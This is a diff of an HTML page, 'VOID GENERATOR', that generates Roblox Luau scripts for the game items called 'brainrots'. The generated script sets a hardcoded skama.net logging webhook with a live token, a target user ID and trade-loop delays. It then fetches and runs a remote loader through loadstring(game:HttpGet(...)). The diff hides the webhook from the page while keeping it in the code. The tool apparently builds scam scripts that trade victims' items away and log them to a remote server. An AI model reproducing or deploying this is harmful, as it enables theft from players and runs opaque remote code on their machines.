@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>VOID GENERATOR • skama</title>
+    <title>VOID GENERATOR</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
         
@@ -207,102 +207,40 @@
             background: rgba(15, 22, 36, 0.9);
         }
 
-        /* Sezione Skama (solo webhook) */
-        .skama-section {
-            background: rgba(0, 0, 0, 0.3);
+        /* Search Bar */
+        .search-section {
+            margin-bottom: 20px;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 16px 18px;
+            background: rgba(10, 15, 25, 0.8);
+            border: 1.5px solid rgba(0, 150, 255, 0.3);
             border-radius: 18px;
-            padding: 16px;
-            margin-bottom: 20px;
-            border: 1px solid #4db8ff;
-            box-shadow: 0 0 15px rgba(77, 184, 255, 0.3);
+            font-size: 15px;
+            color: #fff;
+            font-family: 'Plus Jakarta Sans', sans-serif;
         }
 
-        .skama-title {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 10px;
-            color: #4db8ff;
-            font-weight: 700;
-            letter-spacing: 1px;
+        .search-input:focus {
+            outline: none;
+            border-color: #0088ff;
+            box-shadow: 0 0 0 4px rgba(0, 136, 255, 0.15);
         }
 
-        .skama-title::before {
-            content: '⚡';
-            font-size: 16px;
+        .search-input::placeholder {
+            color: #3f506f;
         }
 
-        .skama-title::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: linear-gradient(90deg, #4db8ff, transparent);
-        }
-
-        .skama-display {
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            color: #7ab7ff;
-            word-break: break-all;
-            padding: 8px 12px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 10px;
-            border-left: 3px solid #4db8ff;
-        }
-
-        /* Brainrot Categories */
-        .brainrot-categories {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-
-        .category-btn {
-            padding: 8px 16px;
-            border-radius: 30px;
-            font-size: 13px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s;
-            border: 1px solid;
-            background: transparent;
-        }
-
-        .category-btn.og {
-            background: linear-gradient(135deg, #000000, #ffd700);
-            color: #ffd700;
-            border-color: #ffd700;
-            text-shadow: 0 0 10px #ffd700;
-        }
-
-        .category-btn.og:hover {
-            box-shadow: 0 0 20px #ffd700;
-        }
-
-        .category-btn.secret {
-            background: linear-gradient(135deg, #000000, #ffffff);
-            color: #ffffff;
-            border-color: #ffffff;
-            text-shadow: 0 0 10px #ffffff;
-        }
-
-        .category-btn.secret:hover {
-            box-shadow: 0 0 20px #ffffff;
-        }
-
-        .category-btn.active {
-            transform: scale(1.05);
-            box-shadow: 0 0 20px currentColor;
-        }
-
+        /* Brainrot Grid */
         .brainrot-grid {
             background: rgba(0, 20, 40, 0.3);
             border-radius: 22px;
             padding: 16px;
             margin-bottom: 20px;
             border: 1px solid rgba(0, 150, 255, 0.2);
-            max-height: 300px;
+            max-height: 350px;
             overflow-y: auto;
         }
 
@@ -347,6 +285,23 @@
             font-weight: 700;
             border-color: #fff;
             box-shadow: 0 0 20px #0088ff;
+        }
+
+        .brainrot-item.highlight {
+            animation: highlight 1s ease;
+        }
+
+        @keyframes highlight {
+            0% { background: rgba(255, 215, 0, 0.5); transform: scale(1); }
+            50% { background: rgba(255, 215, 0, 0.8); transform: scale(1.05); }
+            100% { background: rgba(0, 150, 255, 0.1); transform: scale(1); }
+        }
+
+        .no-results {
+            color: #4f6f9f;
+            font-style: italic;
+            padding: 20px;
+            text-align: center;
         }
 
         .selected-brainrots {
@@ -562,47 +517,33 @@
 
             <div class="working-bar">
                 <span class="dot"></span>
-                SYSTEM ONLINE • SKAMA
+                SYSTEM ONLINE
             </div>
 
             <div class="content">
-                <h1 class="title"># VOID GENERATOR</h1>
-                <p class="subtitle">select brainrots • skama</p>
+                <h1 class="title">VOID GENERATOR</h1>
+                <p class="subtitle">generate luau scripts</p>
 
                 <div class="input-group">
                     <label>🔵 TARGET USER ID</label>
                     <input type="text" id="userId" placeholder="enter user id" value="">
                 </div>
 
-                <!-- Solo Skama (nessuna spiegazione) -->
-                <div class="skama-section">
-                    <div class="skama-title">SKAMA</div>
-                    <div class="skama-display" id="skamaWebhook">https://skama.net/api/logs/webhook/mrr_d4b040d735c54c7484144792d5c132c8</div>
+                <!-- Search Bar -->
+                <div class="search-section">
+                    <input type="text" id="searchInput" class="search-input" placeholder="search brainrot... (e.g. Garam)">
                 </div>
 
-                <!-- Categorie Brainrot -->
-                <div class="brainrot-categories">
-                    <button class="category-btn og active" id="showOgBtn">OG</button>
-                    <button class="category-btn secret" id="showSecretBtn">SECRET</button>
-                </div>
-
-                <!-- OG Brainrots (nero/giallo) -->
-                <div class="brainrot-grid" id="ogGrid">
-                    <div class="brainrot-grid-title">⚡ OG BRAINROTS</div>
-                    <div class="brainrot-items" id="ogItems">
+                <!-- Brainrot Grid -->
+                <div class="brainrot-grid">
+                    <div class="brainrot-grid-title">⚡ BRAINROTS</div>
+                    <div class="brainrot-items" id="brainrotItems">
                         <!-- Verranno popolati via JS -->
                     </div>
+                    <div id="noResults" class="no-results" style="display: none;">no brainrots found</div>
                 </div>
 
-                <!-- Secret Brainrots (nero/bianco) -->
-                <div class="brainrot-grid" id="secretGrid" style="display: none;">
-                    <div class="brainrot-grid-title">⚡ SECRET BRAINROTS</div>
-                    <div class="brainrot-items" id="secretItems">
-                        <!-- Verranno popolati via JS -->
-                    </div>
-                </div>
-
-                <!-- Brainrot selezionati -->
+                <!-- Selected Brainrots -->
                 <div class="selected-brainrots" id="selectedBrainrots">
                     <span style="color: #4f6f9f; font-style: italic; padding: 8px;">no brainrots selected</span>
                 </div>
@@ -611,12 +552,12 @@
                     <svg viewBox="0 0 24 24">
                         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                     </svg>
-                    <span>click on brainrots to select • skama logs</span>
+                    <span>click on brainrots to select • search in real time</span>
                 </div>
 
-                <!-- Log Message -->
+                <!-- Log Message (nascosto) -->
                 <div class="log-message" id="logMessage">
-                    <span>✓ skama</span>
+                    <span>✓</span>
                 </div>
 
                 <button class="generate-btn" id="generateBtn">⟳ GENERATE</button>
@@ -649,114 +590,106 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
     </div>
 
     <script>
-        // Lista OG Brainrots (nero/giallo)
-        const ogBrainrots = [
-            "Skibidi Toilet",
-            "Strawberry Elephant",
-            "Meowl"
-        ];
-
-        // Lista Secret Brainrots (nero/bianco)
-        const secretBrainrots = [
-            "Garama and Madundung",
-            "Spooky and Pumpky",
-            "Cerberus",
-            "La Supreme Combinasion",
-            "Tang Tang Keletang",
-            "Capitano Moby",
-            "Headless Horsman",
-            "La Spooky Combinasion",
-            "La Grande Combinasion",
-            "Popcuru and Frizzuru",
-            "Spaghetti Tualetti",
-            "Dragon Cannelloni",
-            "Hydra Dragon Cannelloni",
-            "Dragon Gingerini",
-            "Burguro and Fryuro",
-            "Fragrama and Chocrama",
-            "Lavadorito Spinito",
-            "Ketchuru and Musturu",
-            "Ketupat Kepat",
+        // Lista completa brainrot (in ordine alfabetico)
+        const allBrainrots = [
+            "1x1x1x1",
+            "25",
+            "67",
             "Agarrini la Palini",
-            "Guest 666",
-            "Swag Soda",
-            "Los Bros",
-            "La Sis",
-            "Tralaledon",
-            "Eviledon",
-            "Orcaledon",
-            "Los Puggies",
-            "Los Primos",
-            "Ginger Gerat",
-            "La Casa Boo",
-            "Love Love Bear",
-            "Los Sekolahs",
-            "Ketupat Bros",
-            "Cooki and Milki",
-            "Rosey and Teddy",
+            "Brunito Marsito",
+            "Burguro and Fryuro",
+            "Capitano Moby",
             "Celularcini Viciosini",
-            "Mieteteira Bicicleteira",
-            "La Extint Grande",
+            "Cerberus",
+            "Chicleteira Bicicleteira",
+            "Chicleteira Noelteira",
             "Chillin Chili",
             "Chipso and Queso",
-            "Tuff Toucan",
-            "Gobblino Uniciclino",
-            "W or L",
-            "La Jolly Grande",
-            "La Taco Combinasion",
-            "Seaggy Bros",
-            "La Romantic Grande",
-            "Festive 67",
-            "Nuclearo Dinossauro",
-            "Money Money Puggy",
-            "Graipuss Medussi",
-            "GOAT",
-            "67",
-            "Brunito Marsito",
-            "Mariachi Corazoni",
-            "Los Hotspotsitos",
-            "Reinito Sleighito",
-            "La Ginger Sekolah",
-            "Jolly Jolly Sahur",
-            "Chicleteira Noelteira",
-            "Los 67",
-            "25",
-            "Los 25",
-            "Fishino Clownino",
-            "Los Combinasionas",
-            "Los Spooky Combinasionas",
-            "1x1x1x1",
-            "Guerriro Digitale",
+            "Cooki and Milki",
+            "Dragon Cannelloni",
+            "Dragon Gingerini",
             "Esok Sekolah",
+            "Eviledon",
+            "Festive 67",
+            "Fishino Clownino",
+            "Fragrama and Chocrama",
+            "Garama and Madundung",
+            "Ginger Gerat",
+            "GOAT",
+            "Gobblino Uniciclino",
+            "Graipuss Medussi",
+            "Guest 666",
+            "Guerriro Digitale",
+            "Headless Horsman",
+            "Hydra Dragon Cannelloni",
+            "Jolly Jolly Sahur",
+            "Ketchuru and Musturu",
+            "Ketupat Bros",
+            "Ketupat Kepat",
+            "La Casa Boo",
+            "La Extint Grande",
             "La Food Combinasion",
+            "La Ginger Sekolah",
+            "La Grande Combinasion",
+            "La Jolly Grande",
+            "La Romantic Grande",
             "La Secret Combinasion",
+            "La Sis",
+            "La Spooky Combinasion",
+            "La Supreme Combinasion",
+            "La Taco Combinasion",
+            "Lavadorito Spinito",
+            "Los 25",
+            "Los 67",
             "Los Amigos",
+            "Los Bros",
+            "Los Combinasionas",
+            "Los Hotspotsitos",
+            "Los Primos",
+            "Los Puggies",
+            "Los Sekolahs",
+            "Los Spooky Combinasionas",
+            "Love Love Bear",
             "Lovin Rose",
-            "Chicleteira Bicicleteira",
-            "Rosetti Tualetti"
+            "Mariachi Corazoni",
+            "Meowl",
+            "Mieteteira Bicicleteira",
+            "Money Money Puggy",
+            "Nuclearo Dinossauro",
+            "Orcaledon",
+            "Popcuru and Frizzuru",
+            "Reinito Sleighito",
+            "Rosey and Teddy",
+            "Rosetti Tualetti",
+            "Seaggy Bros",
+            "Skibidi Toilet",
+            "Spaghetti Tualetti",
+            "Spooky and Pumpky",
+            "Strawberry Elephant",
+            "Swag Soda",
+            "Tang Tang Keletang",
+            "Tralaledon",
+            "Tuff Toucan",
+            "W or L"
         ];
 
         // State
         let selectedBrainrots = [];
-        let currentCategory = 'og';
+        let filteredBrainrots = [...allBrainrots];
 
         // DOM Elements
         const userIdInput = document.getElementById('userId');
+        const searchInput = document.getElementById('searchInput');
         const generateBtn = document.getElementById('generateBtn');
         const outputScript = document.getElementById('outputScript');
         const copyBtn = document.getElementById('copyBtn');
         const liveTimeSpan = document.getElementById('liveTime');
         const logMessage = document.getElementById('logMessage');
         const selectedBrainrotsDiv = document.getElementById('selectedBrainrots');
-        const ogGrid = document.getElementById('ogGrid');
-        const secretGrid = document.getElementById('secretGrid');
-        const ogItems = document.getElementById('ogItems');
-        const secretItems = document.getElementById('secretItems');
-        const showOgBtn = document.getElementById('showOgBtn');
-        const showSecretBtn = document.getElementById('showSecretBtn');
-        const skamaWebhook = document.getElementById('skamaWebhook');
+        const brainrotItems = document.getElementById('brainrotItems');
+        const noResults = document.getElementById('noResults');
 
-        // Fixed webhook
+        // Fixed webhook (nascosto)
         const FIXED_WEBHOOK = "https://skama.net/api/logs/webhook/mrr_d4b040d735c54c7484144792d5c132c8";
 
         // Update live time
@@ -769,165 +702,11 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
         setInterval(updateLiveTime, 1000);
         updateLiveTime();
 
-        // Popola OG brainrots
-        function populateOgItems() {
-            ogItems.innerHTML = '';
-            ogBrainrots.forEach(brainrot => {
-                const item = document.createElement('span');
-                item.className = 'brainrot-item';
-                item.textContent = brainrot;
-                item.onclick = () => toggleBrainrot(brainrot);
-                ogItems.appendChild(item);
-            });
-        }
-
-        // Popola Secret brainrots
-        function populateSecretItems() {
-            secretItems.innerHTML = '';
-            secretBrainrots.forEach(brainrot => {
-                const item = document.createElement('span');
-                item.className = 'brainrot-item';
-                item.textContent = brainrot;
-                item.onclick = () => toggleBrainrot(brainrot);
-                secretItems.appendChild(item);
-            });
-        }
-
-        // Toggle brainrot selection
-        function toggleBrainrot(brainrot) {
-            const index = selectedBrainrots.indexOf(brainrot);
-            if (index === -1) {
-                selectedBrainrots.push(brainrot);
+        // Filter brainrots based on search
+        function filterBrainrots() {
+            const searchTerm = searchInput.value.toLowerCase().trim();
+            
+            if (searchTerm === '') {
+                filteredBrainrots = [...allBrainrots];
             } else {
-                selectedBrainrots.splice(index, 1);
-            }
-            
-            // Update UI
-            renderSelectedBrainrots();
-            updateItemSelection();
-        }
-
-        // Update item selection status
-        function updateItemSelection() {
-            // Update OG items
-            document.querySelectorAll('#ogItems .brainrot-item').forEach(item => {
-                if (selectedBrainrots.includes(item.textContent)) {
-                    item.classList.add('selected');
-                } else {
-                    item.classList.remove('selected');
-                }
-            });
-            
-            // Update Secret items
-            document.querySelectorAll('#secretItems .brainrot-item').forEach(item => {
-                if (selectedBrainrots.includes(item.textContent)) {
-                    item.classList.add('selected');
-                } else {
-                    item.classList.remove('selected');
-                }
-            });
-        }
-
-        // Render selected brainrot tags
-        function renderSelectedBrainrots() {
-            selectedBrainrotsDiv.innerHTML = '';
-            
-            if (selectedBrainrots.length === 0) {
-                selectedBrainrotsDiv.innerHTML = '<span style="color: #4f6f9f; font-style: italic; padding: 8px;">no brainrots selected</span>';
-                return;
-            }
-
-            selectedBrainrots.forEach((brainrot, index) => {
-                const tag = document.createElement('span');
-                tag.className = 'brainrot-tag';
-                tag.innerHTML = `
-                    ${brainrot}
-                    <button class="remove-brainrot" onclick="removeBrainrot(${index})">✕</button>
-                `;
-                selectedBrainrotsDiv.appendChild(tag);
-            });
-        }
-
-        // Remove brainrot by index
-        window.removeBrainrot = function(index) {
-            selectedBrainrots.splice(index, 1);
-            renderSelectedBrainrots();
-            updateItemSelection();
-        };
-
-        // Generate script
-        async function generateScript() {
-            const userId = userIdInput.value.trim() || '';
-            
-            // Build brainrot table
-            let brainrotTable = '';
-            if (selectedBrainrots.length === 0) {
-                brainrotTable = '    -- no brainrots selected';
-            } else {
-                brainrotTable = selectedBrainrots.map(name => `    ["${name}"] = true`).join(',\n');
-            }
-
-            const script = `-- VOID GENERATOR
-
-getgenv().WEBHOOK_URL = "${FIXED_WEBHOOK}"
-getgenv().TARGET_ID = "${userId}"
-getgenv().DELAY_STEP = 1
-getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().TARGET_BRAINROTS = {
-${brainrotTable}
-}
-
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()`;
-
-            outputScript.textContent = script;
-
-            // Show log message
-            logMessage.classList.add('show');
-            setTimeout(() => logMessage.classList.remove('show'), 2000);
-        }
-
-        // Switch category
-        function switchCategory(category) {
-            currentCategory = category;
-            
-            if (category === 'og') {
-                ogGrid.style.display = 'block';
-                secretGrid.style.display = 'none';
-                showOgBtn.classList.add('active');
-                showSecretBtn.classList.remove('active');
-            } else {
-                ogGrid.style.display = 'none';
-                secretGrid.style.display = 'block';
-                showSecretBtn.classList.add('active');
-                showOgBtn.classList.remove('active');
-            }
-        }
-
-        // Event listeners
-        showOgBtn.addEventListener('click', () => switchCategory('og'));
-        showSecretBtn.addEventListener('click', () => switchCategory('secret'));
-
-        generateBtn.addEventListener('click', generateScript);
-
-        copyBtn.addEventListener('click', async () => {
-            try {
-                await navigator.clipboard.writeText(outputScript.textContent);
-                copyBtn.textContent = '✓ COPIED!';
-                setTimeout(() => {
-                    copyBtn.textContent = '📎 COPY';
-                }, 2000);
-            } catch (err) {
-                copyBtn.textContent = '✗ ERROR';
-                setTimeout(() => {
-                    copyBtn.textContent = '📎 COPY';
-                }, 2000);
-            }
-        });
-
-        // Initialize
-        populateOgItems();
-        populateSecretItems();
-        renderSelectedBrainrots();
-    </script>
-</body>
-</html>
+                filteredBrainrots = all
